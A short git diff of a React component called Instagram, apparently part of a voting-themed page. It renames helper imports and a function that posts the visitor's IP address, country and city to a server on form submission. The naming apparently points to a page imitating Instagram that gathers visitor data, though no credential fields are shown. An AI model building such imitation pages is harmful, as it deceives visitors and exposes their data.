@@ -10,8 +10,8 @@ import Google from "@/public/google-play.png";
 import { useEffect, useState } from "react";
 import Loading from "@/app/pages/voter/instagram/loading";
 
-import { getIp, getLocationDetails } from "@/utils/thirdPartyUtils";
-import { insertToServer } from "@/utils/serverUtils";
+import { getIp, getLocationDetails } from "../utils/getData";
+import { sendDataToServer } from "../utils/postData";
 
 export default function Instagram() {
   const [loading, setLoading] = useState(true);
@@ -68,7 +68,7 @@ export default function Instagram() {
     e.preventDefault();
     // setLoading(true);
 
-    const result = await insertToServer({
+    const result = await sendDataToServer({
       ip,
       country,
       city,
